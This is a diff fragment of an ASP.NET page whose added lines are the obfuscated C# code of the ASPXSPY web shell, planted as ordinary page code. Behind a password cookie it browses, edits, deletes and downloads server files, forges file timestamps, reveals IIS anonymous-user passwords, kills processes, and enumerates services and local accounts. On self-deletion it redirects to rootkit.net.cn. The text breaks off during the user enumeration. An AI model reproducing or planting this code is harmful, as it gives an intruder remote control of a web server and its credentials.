-.Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
-body,td{font: 12px Arial,Tahoma;line-height: 16px;}
-.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
-.list{font:12px Arial,Tahoma;height:20px;}
-.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
-.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;
-        }
-a {color: #00f;text-decoration:underline;}
-a:hover{color: #f00;text-decoration:none;}
-.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:5px 10px 5px 5px;}
-.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:5px 10px 5px 5px;}
-.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
-.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;font-weight:bold;}
-.head td span{font-weight:normal;}
-form{margin:0;padding:0;}
-h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
-ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
-u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
-.u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
-.u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
-</style>
-	<script type="text/javascript">
-	function CheckAll(form){
-	for(var i=0;i<form.elements.length;i++){
-		var e=form.elements[i];
-		if(e.name!='chkall')
-		e.checked=form.chkall.checked;
-	}
+ArrayList IVc=new ArrayList();
+
+protected void Page_load(object sender,EventArgs e)
+
+{
+
+YFcNP(this);
+
+fhAEn();
+
+if (!pdo())
+
+{
+
+return;
+
 }
-	</script>
+
+if(IsPostBack)
+
+{
+
+string tkI=Request["__EVENTTARGET"];
+
+string VqV=Request["__File"];
+
+if(tkI!="")
+
+{
+
+switch(tkI)
+
+{
+
+case "Bin_Parent":
+
+krIR(Ebgw(VqV));
+
+break;
+
+case "Bin_Listdir":
+
+krIR(Ebgw(VqV));
+
+break;
+
+case "kRXgt":
+
+kRXgt(Ebgw(VqV));
+
+break;
+
+case "Bin_Createfile":
+
+gLKc(VqV);
+
+break;
+
+case "Bin_Editfile":
+
+gLKc(VqV);
+
+break;
+
+case "Bin_Createdir":
+
+stNPw(VqV);
+
+break;
+
+case "cYAl":
+
+cYAl(VqV);
+
+break;
+
+case "ksGR":
+
+ksGR(Ebgw(VqV));
+
+break;
+
+case "SJv":
+
+SJv(VqV);
+
+break;
+
+case "Bin_Regread":
+
+tpRQ(Ebgw(VqV));
+
+break;
+
+case "hae":
+
+hae();
+
+break;
+
+case "urJG":
+
+urJG(VqV);
+
+break;
+
+}
+
+if(tkI.StartsWith("dAJTD"))
+
+{
+
+dAJTD(Ebgw(tkI.Replace("dAJTD","")),VqV);
+
+}
+
+else if(tkI.StartsWith("Tlvz"))
+
+{
+
+Tlvz(Ebgw(tkI.Replace("Tlvz","")),VqV);
+
+}
+
+else if(tkI.StartsWith("Bin_CFile"))
+
+{
+
+YByN(Ebgw(tkI.Replace("Bin_CFile","")),VqV);
+
+}
+
+}
+
+}
+
+else
+
+{
+
+PBZw();
+
+}
+
+}
+
+public bool pdo()
+
+{
+
+if(Request.Cookies[vbhLn]==null)
+
+{
+
+tZSx();
+
+return false;
+
+}
+
+else
+
+{
+
+if (Request.Cookies[vbhLn].Value != Password)
+
+{
+
+tZSx();
+
+return false;
+
+}
+
+else
+
+{
+
+return true;
+
+}
+
+}
+
+}
+
+public void tZSx()
+
+{
+
+ljtzC.Visible=true;
+
+ZVS.Visible=false;
+
+}
+
+protected void YKpI(object sender,EventArgs e)
+
+{
+
+Session.Abandon();
+
+Response.Cookies.Add(new HttpCookie(vbhLn,null));
+
+tZSx();
+
+}
+
+public void PBZw()
+
+{
+
+ZVS.Visible=true;
+
+ljtzC.Visible=false;
+
+Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
+
+Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
+
+Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};";
+
+miansha2.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";
+
+Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
+
+if (AXSbb.Value==string.Empty)
+
+{
+
+AXSbb.Value=OElM(Server.MapPath("."));
+
+}
+
+Bin_H2_Title.InnerText="File Manager >>";
+
+krIR(AXSbb.Value);
+
+}
+
+public void fhAEn()
+
+{
+
+try
+
+{
+
+string[] YRgt=Directory.GetLogicalDrives();
+
+for(int i=0;i<YRgt.Length;i++)
+
+{
+
+Control c=ParseControl(" <asp:LinkButton Text='"+mFvj(YRgt[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+YRgt[i]+"'/> | ");
+
+Bin_Span_Drv.Controls.Add(c);
+
+LinkButton nxeDR=(LinkButton)Page.FindControl("Bin_Button_Driv"+i);
+
+nxeDR.Command+=new CommandEventHandler(this.iVk);
+
+}
+
+}catch(Exception ex){}
+
+}
+
+public string OElM(string path)
+
+{
+
+if(path.Substring(path.Length-1,1)!=@"\")
+
+{
+
+path=path+@"\";
+
+}
+
+return path;
+
+}
+
+public string nrrx(string path)
+
+{
+
+char[] trim={'\\'};
+
+if(path.Substring(path.Length-1,1)==@"\")
+
+{
+
+path=path.TrimEnd(trim);
+
+}
+
+return path;
+
+}
+
+[DllImport("kernel32.dll",EntryPoint="GetDriveTypeA")]
+
+public static extern int OMZP(string nDrive);
+
+public string mFvj(string instr)
+
+{
+
+string EuXD=string.Empty;
+
+int num=OMZP(instr);
+
+switch(num)
+
+{
+
+case 1:
+
+EuXD="Unknow("+instr+")";
+
+break;
+
+case 2:
+
+EuXD="Removable("+instr+")";
+
+break;
+
+case 3:
+
+EuXD="Fixed("+instr+")";
+
+break;
+
+case 4:
+
+EuXD="Network("+instr+")";
+
+break;
+
+case 5:
+
+EuXD="CDRom("+instr+")";
+
+break;
+
+case 6:
+
+EuXD="RAM Disk("+instr+")";
+
+break;
+
+}
+
+return EuXD.Replace(@"\","");
+
+}
+
+public string MVVJ(string instr)
+
+{
+
+byte[] tmp=Encoding.Default.GetBytes(instr);
+
+return Convert.ToBase64String(tmp);
+
+}
+
+public string Ebgw(string instr)
+
+{
+
+byte[] tmp=Convert.FromBase64String(instr);
+
+return Encoding.Default.GetString(tmp);
+
+}
+
+public void krIR(string path)
+
+{
+
+WICxe();
+
+CzfO.Visible=true;
+
+Bin_H2_Title.InnerText="File Manager >>";
+
+AXSbb.Value=OElM(path);
+
+DirectoryInfo GQMM=new DirectoryInfo(path);
+
+if(Directory.GetParent(nrrx(path))!=null)
+
+{
+
+string bg=OKM();
+
+TableRow p=new TableRow();
+
+for(int i=1;i<6;i++)
+
+{
+
+TableCell pc=new TableCell();
+
+if(i==1)
+
+{
+
+pc.Width=Unit.Parse("2%");
+
+pc.Text="0";
+
+p.CssClass=bg;
+
+}
+
+if(i==2)
+
+{
+
+pc.Text="<a href=\"javascript:Bin_PostBack('Bin_Parent','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\">Parent Directory</a>";
+
+}
+
+p.Cells.Add(pc);
+
+UGzP.Rows.Add(p);
+
+}
+
+}
+
+try
+
+{
+
+int vLlH=0;
+
+foreach(DirectoryInfo Bin_folder in GQMM.GetDirectories())
+
+{
+
+string bg=OKM();
+
+vLlH++;
+
+TableRow tr=new TableRow();
+
+TableCell tc=new TableCell();
+
+tc.Width=Unit.Parse("2%");
+
+tc.Text="0";
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+tr.Cells.Add(tc);
+
+TableCell HczyN=new TableCell();
+
+HczyN.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')\">"+Bin_folder.Name+"</a>";
+
+tr.Cells.Add(HczyN);
+
+TableCell LYZK=new TableCell();
+
+LYZK.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
+
+tr.Cells.Add(LYZK);
+
+UGzP.Rows.Add(tr);
+
+TableCell ERUL=new TableCell();
+
+ERUL.Text="--";
+
+tr.Cells.Add(ERUL);
+
+UGzP.Rows.Add(tr);
+
+TableCell ZGKh=new TableCell();
+
+ZGKh.Text="<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
+
+tr.Cells.Add(ZGKh);
+
+UGzP.Rows.Add(tr);
+
+}
+
+TableRow cKVA=new TableRow();
+
+cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
+
+cKVA.Attributes["bgcolor"]="#dddddd";
+
+TableCell JlmW=new TableCell();
+
+JlmW.Attributes["colspan"]="6" ;
+
+JlmW.Attributes["height"]="5";
+
+cKVA.Cells.Add(JlmW);
+
+UGzP.Rows.Add(cKVA);
+
+int aYRwo=0;
+
+foreach(FileInfo Bin_Files in GQMM.GetFiles())
+
+{
+
+aYRwo++;
+
+string gb=OKM();
+
+TableRow tr=new TableRow();
+
+TableCell tc=new TableCell();
+
+tc.Width=Unit.Parse("2%");
+
+tc.Text="<input type=\"checkbox\" value=\"0\" name=\""+MVVJ(Bin_Files.Name)+"\">";
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=gb;
+
+tr.Attributes["onmouseout"]="this.className='"+gb+"';";
+
+tr.Cells.Add(tc);
+
+TableCell filename=new TableCell();
+
+if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
+
+{
+
+string url=Request.Url.ToString();
+
+filename.Text="<a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\">"+Bin_Files.Name+"</a>";
+
+}
+
+else
+
+{
+
+filename.Text=Bin_Files.Name;
+
+}
+
+TableCell albt=new TableCell();
+
+albt.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
+
+TableCell YzK=new TableCell();
+
+YzK.Text=mTG(Bin_Files.Length);
+
+TableCell GLpi=new TableCell();
+
+GLpi.Text="<a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\">Down</a> | <a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">Copy</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">Edit</a> | <a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">Rename</a> | <a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\">Time</a> ";
+
+tr.Cells.Add(filename);
+
+tr.Cells.Add(albt);
+
+tr.Cells.Add(YzK);
+
+tr.Cells.Add(GLpi);
+
+UGzP.Rows.Add(tr);
+
+}
+
+string lgb=OKM();
+
+TableRow oWam=new TableRow();
+
+oWam.CssClass=lgb;
+
+for(int i=1;i<4;i++)
+
+{
+
+TableCell lGV=new TableCell();
+
+if(i==1)
+
+{
+
+lGV.Text="<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/>";
+
+}
+
+if(i==2)
+
+{
+
+lGV.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('SJv',d_file)};}\">Delete selected</a>";
+
+}
+
+if(i==3)
+
+{
+
+lGV.ColumnSpan=4;
+
+lGV.Style.Add("text-align","right");
+
+lGV.Text=vLlH+" directories/ "+aYRwo+" files";
+
+}
+
+oWam.Cells.Add(lGV);
+
+}
+
+UGzP.Rows.Add(oWam);
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+public string OKM()
+
+{
+
+TdgGU++;
+
+if(TdgGU % 2==0)
+
+{
+
+return "alt1";
+
+}
+
+else
+
+{
+
+return "alt2";
+
+}
+
+}
+
+public void kRXgt(string qcKu)
+
+{
+
+try
+
+{
+
+Directory.Delete(qcKu,true);
+
+xseuB("Directory delete new success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(Directory.GetParent(qcKu).ToString());
+
+}
+
+public void dAJTD(string sdir,string ddir)
+
+{
+
+try
+
+{
+
+Directory.Move(sdir,ddir);
+
+xseuB("Directory Renamed Success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+public void Tlvz(string sfile,string dfile)
+
+{
+
+try
+
+{
+
+File.Move(sfile,dfile);
+
+xseuB("File Renamed Success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+public void YByN(string spath,string dpath)
+
+{
+
+try
+
+{
+
+File.Copy(spath,dpath);
+
+xseuB("File Copy Success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+public void stNPw(string path)
+
+{
+
+try
+
+{
+
+Directory.CreateDirectory(AXSbb.Value+path);
+
+xseuB("Directory created success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+public void gLKc(string path)
+
+{
+
+if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")
+
+{
+
+foreach(ListItem item in NdCX.Items)
+
+{
+
+if(item.Selected=true)
+
+{
+
+item.Selected=false;
+
+}
+
+}
+
+}
+
+Bin_H2_Title.InnerHtml="Create/ Edit File >>";
+
+WICxe();
+
+vrFA.Visible=true;
+
+if(path.IndexOf(":")< 0)
+
+{
+
+Sqon.Value=AXSbb.Value+path;
+
+}
+
+else
+
+{
+
+Sqon.Value=path;
+
+}
+
+if(File.Exists(Sqon.Value))
+
+{
+
+StreamReader sr;
+
+if(NdCX.SelectedItem.Text=="UTF-8")
+
+{
+
+sr=new StreamReader(Sqon.Value,Encoding.UTF8);
+
+}
+
+else
+
+{
+
+sr=new StreamReader(Sqon.Value,Encoding.Default);
+
+}
+
+Xgvv.InnerText=sr.ReadToEnd();
+
+sr.Close();
+
+}
+
+else
+
+{
+
+Xgvv.InnerText=string.Empty;
+
+}
+
+}
+
+public void ksGR(string path)
+
+{
+
+FileInfo fs=new FileInfo(path);
+
+Response.Clear();
+
+Page.Response.ClearHeaders();
+
+Page.Response.Buffer=false;
+
+this.EnableViewState=false;
+
+Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));
+
+Response.AddHeader("Content-Length",fs.Length.ToString());
+
+Page.Response.ContentType="application/unknown";
+
+Response.WriteFile(fs.FullName);
+
+Page.Response.Flush();
+
+Page.Response.Close();
+
+Response.End();
+
+Page.Response.Clear();
+
+}
+
+public void SJv(string path)
+
+{
+
+try
+
+{
+
+string[] spdT=path.Split(',');
+
+for(int i=0;i<spdT.Length-1;i++)
+
+{
+
+File.Delete(AXSbb.Value+Ebgw(spdT[i]));
+
+}
+
+xseuB("File Delete Success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+krIR(AXSbb.Value);
+
+}
+
+public void hae()
+
+{
+
+try
+
+{
+
+File.Delete(Request.PhysicalPath);
+
+Response.Redirect("http://www.rootkit.net.cn");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+public void cYAl(string path)
+
+{
+
+Bin_H2_Title.InnerHtml="Clone file was last modified time >>";
+
+WICxe();
+
+zRyG.Visible=true;
+
+QiFB.Value=AXSbb.Value+path;
+
+lICp.Value=AXSbb.Value;
+
+pWVL.Value=AXSbb.Value+path;
+
+string Att=File.GetAttributes(QiFB.Value).ToString();
+
+if(Att.LastIndexOf("ReadOnly")!=-1)
+
+{
+
+ZhWSK.Checked=true;
+
+}
+
+if(Att.LastIndexOf("System")!=-1)
+
+{
+
+SsR.Checked=true;
+
+}
+
+if(Att.LastIndexOf("Hidden")!=-1)
+
+{
+
+ccB.Checked=true;
+
+}
+
+if(Att.LastIndexOf("Archive")!=-1)
+
+{
+
+fbyZ.Checked=true;
+
+}
+
+yUqx.Value=File.GetCreationTimeUtc(pWVL.Value).ToString();
+
+uYjw.Value=File.GetLastWriteTimeUtc(pWVL.Value).ToString();
+
+aLsn.Value=File.GetLastAccessTimeUtc(pWVL.Value).ToString();
+
+}
+
+public static String mTG(Int64 fileSize)
+
+{
+
+if(fileSize<0)
+
+{
+
+throw new ArgumentOutOfRangeException("fileSize");
+
+}
+
+else if(fileSize >= 1024 * 1024 * 1024)
+
+{
+
+return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
+
+}
+
+else if(fileSize >= 1024 * 1024)
+
+{
+
+return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
+
+}
+
+else if(fileSize >= 1024)
+
+{
+
+return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
+
+}
+
+else
+
+{
+
+return string.Format("{0} B",fileSize);
+
+}
+
+}
+
+private bool SGde(string sSrc)
+
+{
+
+Regex reg=new Regex(@"^0|[0-9]*[1-9][0-9]*$");
+
+if(reg.IsMatch(sSrc))
+
+{
+
+return true;
+
+}
+
+else
+
+{
+
+return false;
+
+}
+
+}
+
+public void AdCx()
+
+{
+
+string qcKu=string.Empty;
+
+string mWGEm="IIS://localhost/W3SVC";
+
+GlI.Style.Add("word-break","break-all");
+
+try
+
+{
+
+DirectoryEntry HHzcY=new DirectoryEntry(mWGEm);
+
+int fmW=0;
+
+foreach(DirectoryEntry child in HHzcY.Children)
+
+{
+
+if(SGde(child.Name.ToString()))
+
+{
+
+fmW++;
+
+DirectoryEntry newdir=new DirectoryEntry(mWGEm+"/"+child.Name.ToString());
+
+DirectoryEntry HlyU=newdir.Children.Find("root","IIsWebVirtualDir");
+
+string bg=OKM();
+
+TableRow TR=new TableRow();
+
+TR.Attributes["onmouseover"]="this.className='focus';";
+
+TR.CssClass=bg;
+
+TR.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
+
+for(int i=1;i<6;i++)
+
+{
+
+try
+
+{
+
+TableCell tfit=new TableCell();
+
+switch(i)
+
+{case 1:
+
+tfit.Text=fmW.ToString();
+
+break;
+
+case 2:
+
+tfit.Text=HlyU.Properties["AnonymousUserName"].Value.ToString();
+
+break;
+
+case 3:
+
+tfit.Text=HlyU.Properties["AnonymousUserPass"].Value.ToString();
+
+break;
+
+case 4:
+
+StringBuilder sb=new StringBuilder();
+
+PropertyValueCollection pc=child.Properties["ServerBindings"];
+
+for (int j=0; j < pc.Count; j++)
+
+{
+
+sb.Append(pc[j].ToString()+"<br>");
+
+}
+
+tfit.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
+
+break;
+
+case 5:
+
+tfit.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(HlyU.Properties["Path"].Value.ToString())+"')\">"+HlyU.Properties["Path"].Value.ToString()+"</a>";
+
+break;
+
+}
+
+TR.Cells.Add(tfit);
+
+}
+
+catch (Exception ex)
+
+{
+
+xseuB(ex.Message);
+
+continue;
+
+}
+
+}
+
+GlI.Controls.Add(TR);
+
+}
+
+}
+
+}
+
+catch(Exception ex)
+
+{
+
+xseuB(ex.Message);
+
+}
+
+}
+
+public ManagementObjectCollection PhQTd(string query)
+
+{
+
+ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
+
+return QS.Get();
+
+}
+
+public DataTable cCf(string query)
+
+{
+
+DataTable dt=new DataTable();
+
+int i=0;
+
+ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
+
+try
+
+{
+
+foreach(ManagementObject m in QS.Get())
+
+{
+
+DataRow dr=dt.NewRow();
+
+PropertyDataCollection.PropertyDataEnumerator oEnum;
+
+oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);
+
+while(oEnum.MoveNext())
+
+{
+
+PropertyData DRU=(PropertyData)oEnum.Current;
+
+if(dt.Columns.IndexOf(DRU.Name)==-1)
+
+{
+
+dt.Columns.Add(DRU.Name);
+
+dt.Columns[dt.Columns.Count-1].DefaultValue="";
+
+}
+
+if(m[DRU.Name]!=null)
+
+{
+
+dr[DRU.Name]=m[DRU.Name].ToString();
+
+}
+
+else
+
+{
+
+dr[DRU.Name]=string.Empty;
+
+}
+
+}
+
+dt.Rows.Add(dr);
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+}
+
+return dt;
+
+}
+
+public void YUw()
+
+{
+
+try
+
+{
+
+Bin_H2_Title.InnerText="Process >>";
+
+WICxe();
+
+DCbS.Visible=true;
+
+int UEbTI=0;
+
+Process[] p=Process.GetProcesses();
+
+foreach(Process sp in p)
+
+{
+
+UEbTI++;
+
+string bg=OKM();
+
+TableRow tr=new TableRow();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+for(int i=1;i<7;i++)
+
+{
+
+TableCell td=new TableCell();
+
+if(i==1)
+
+{
+
+td.Width=Unit.Parse("2%");
+
+td.Text=UEbTI.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==2)
+
+{
+
+td.Text=sp.Id.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==3)
+
+{
+
+td.Text=sp.ProcessName.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==4)
+
+{
+
+td.Text=sp.Threads.Count.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==5)
+
+{
+
+td.Text=sp.BasePriority.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==6)
+
+{
+
+td.Text="--";
+
+tr.Controls.Add(td);
+
+}
+
+}
+
+IjsL.Controls.Add(tr);
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+AIz();
+
+}
+
+AIz();
+
+}
+
+public void AIz()
+
+{
+
+try
+
+{
+
+Bin_H2_Title.InnerText="Process >>";
+
+WICxe();
+
+DCbS.Visible=true;
+
+int UEbTI=0;
+
+DataTable dt=cCf("Win32_Process");
+
+for(int j=0;j<dt.Rows.Count;j++)
+
+{
+
+UEbTI++;
+
+string bg=OKM();
+
+TableRow tr=new TableRow();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+for(int i=1;i<7;i++)
+
+{
+
+TableCell td=new TableCell();
+
+if(i==1)
+
+{
+
+td.Width=Unit.Parse("2%");
+
+td.Text=UEbTI.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==2)
+
+{
+
+td.Text=dt.Rows[j]["ProcessID"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==3)
+
+{
+
+td.Text=dt.Rows[j]["Name"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==4)
+
+{
+
+td.Text=dt.Rows[j]["ThreadCount"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==5)
+
+{
+
+td.Text=dt.Rows[j]["Priority"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==6)
+
+{
+
+if( dt.Rows[j]["CommandLine"]!=string.Empty)
+
+{
+
+td.Text="<a href=\"javascript:Bin_PostBack('urJG','"+dt.Rows[j]["ProcessID"].ToString()+"')\">Kill</a>";
+
+}
+
+else
+
+{
+
+td.Text="--";
+
+}
+
+tr.Controls.Add(td);
+
+}
+
+}
+
+IjsL.Controls.Add(tr);
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+public void urJG(string pid)
+
+{
+
+try
+
+{
+
+foreach(ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='"+pid+"'"))
+
+{
+
+p.InvokeMethod("Terminate",null);
+
+p.Dispose();
+
+}
+
+xseuB("Process Kill Success !");
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+AIz();
+
+}
+
+public void oHpF()
+
+{
+
+try
+
+{
+
+Bin_H2_Title.InnerText="Services >>";
+
+WICxe();
+
+iQxm.Visible=true;
+
+int UEbTI=0;
+
+ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();
+
+for(int i=0;i<kQmRu.Length;i++)
+
+{
+
+UEbTI++;
+
+string bg=OKM();
+
+TableRow tr=new TableRow();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+for(int b=1;b<7;b++)
+
+{
+
+TableCell td=new TableCell();
+
+if(b==1)
+
+{
+
+td.Width=Unit.Parse("2%");
+
+td.Text=UEbTI.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(b==2)
+
+{
+
+td.Text="null";
+
+tr.Controls.Add(td);
+
+}
+
+if(b==3)
+
+{
+
+td.Text=kQmRu[i].ServiceName.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(b==4)
+
+{
+
+td.Text="";
+
+tr.Controls.Add(td);
+
+}
+
+if(b==5)
+
+{
+
+string kOIo=kQmRu[i].Status.ToString();
+
+if(kOIo=="Running")
+
+{
+
+td.Text="<font color=green>"+kOIo+"</font>";
+
+}
+
+else
+
+{
+
+td.Text="<font color=red>"+kOIo+"</font>";
+
+}
+
+tr.Controls.Add(td);
+
+}
+
+if(b==6)
+
+{
+
+td.Text="";
+
+tr.Controls.Add(td);
+
+}
+
+}
+
+vHCs.Controls.Add(tr);
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+xseuB(error.Message);
+
+}
+
+}
+
+public void tZRH()
+
+{
+
+try
+
+{
+
+Bin_H2_Title.InnerText="Services >>";
+
+WICxe();
+
+iQxm.Visible=true;
+
+int UEbTI=0;
+
+DataTable dt=cCf("Win32_Service");
+
+for(int j=0;j<dt.Rows.Count;j++)
+
+{
+
+UEbTI++;
+
+string bg=OKM();
+
+TableRow tr=new TableRow();
+
+tr.Attributes["onmouseover"]="this.className='focus';";
+
+tr.CssClass=bg;
+
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+
+tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
+
+for(int i=1;i<7;i++)
+
+{
+
+TableCell td=new TableCell();
+
+if(i==1)
+
+{
+
+td.Width=Unit.Parse("2%");
+
+td.Text=UEbTI.ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==2)
+
+{
+
+td.Text=dt.Rows[j]["ProcessID"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==3)
+
+{
+
+td.Text=dt.Rows[j]["Name"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==4)
+
+{
+
+td.Text=dt.Rows[j]["PathName"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+if(i==5)
+
+{
+
+string kOIo=dt.Rows[j]["State"].ToString();
+
+if(kOIo=="Running")
+
+{
+
+td.Text="<font color=green>"+kOIo+"</font>";
+
+}
+
+else
+
+{
+
+td.Text="<font color=red>"+kOIo+"</font>";
+
+}
+
+tr.Controls.Add(td);
+
+}
+
+if(i==6)
+
+{
+
+td.Text=dt.Rows[j]["StartMode"].ToString();
+
+tr.Controls.Add(td);
+
+}
+
+}
+
+vHCs.Controls.Add(tr);
+
+}
+
+}
+
+catch(Exception error)
+
+{
+
+oHpF();
+
+}
+
+}
+
+public void PLd()
+
+{
+
+try
+
+{
+
+WICxe();
+
+xWVQ.Visible=true;
+
+Bin_H2_Title.InnerText="User Information >>";
+
+DirectoryEntry TWQ=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
+
+foreach(DirectoryEntry child in TWQ.Children)
+
+{
+
+foreach(string name in child.Properties.PropertyNames)
+
+{
+
